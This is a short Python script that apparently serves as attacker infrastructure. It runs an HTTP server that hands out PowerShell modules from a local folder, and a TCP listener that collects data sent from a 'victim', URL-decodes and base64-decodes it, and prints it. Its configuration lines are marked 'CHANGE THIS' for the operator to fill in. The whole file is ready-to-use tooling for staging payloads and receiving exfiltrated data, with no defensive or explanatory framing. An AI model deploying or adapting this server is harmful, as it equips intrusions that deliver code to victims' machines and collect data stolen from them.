import http.server
import socketserver
import socket
import threading
import os
import base64
import urllib.parse
import sys

# CHANGE THIS
HTTP_PORT = 13313 # this is the port hosting the modules
TCP_PORT = 8080 # this is the port receiving the final data
SHARED_DIR = "powershell-modules" # path to the modules


# -------------------------- Server HTTP --------------------------

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def translate_path(self, path):
        # Restriction for only the path with modules
        path = super().translate_path(path)
        head, tail = os.path.split(path)
        
        return os.path.join(os.getcwd(), SHARED_DIR, tail)

class ReusableTCPServer(socketserver.TCPServer):
    allow_reuse_address = True  # fix errors "Already in use" port

def run_http_server():
    handler = CustomHTTPRequestHandler
    with ReusableTCPServer(("", HTTP_PORT), handler) as httpd:
        print(f"[HTTP] Listing for http://0.0.0.0:{HTTP_PORT}/")
        httpd.serve_forever()



# -------------------------- Server TCP --------------------------

def run_tcp_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)  # fix to "Aleady in use" port
        s.bind(("", TCP_PORT))
        s.listen()
        print(f"[TCP] Listening to connections in port {TCP_PORT}...")

        while True:
            conn, addr = s.accept()
            with conn:
                print(f"[TCP] Connection: {addr}")
                
                chunks = []
                while True:
                    data = conn.recv(4096)  # receiving blocks until victim finish sending data
                    if not data:
                        break
                    chunks.append(data)

                raw = b''.join(chunks).decode(errors='ignore')

                # decode url parsing
                url_decoded = urllib.parse.unquote(raw)

                try:
                    # base64 decode
                    base64_decoded = base64.b64decode(url_decoded).decode('utf-8', errors='ignore')
                    print(f"[TCP] Base64-decoded:\n{base64_decoded}")
                except Exception as e:
                    print(f"[!] ERROR: {e}")



# -------------------------- THREADS --------------------------

if __name__ == "__main__":
    try:
        threading.Thread(target=run_http_server, daemon=True).start()
        run_tcp_server()
    except KeyboardInterrupt:
        print("\n[!] Bye!")
        sys.exit(0)
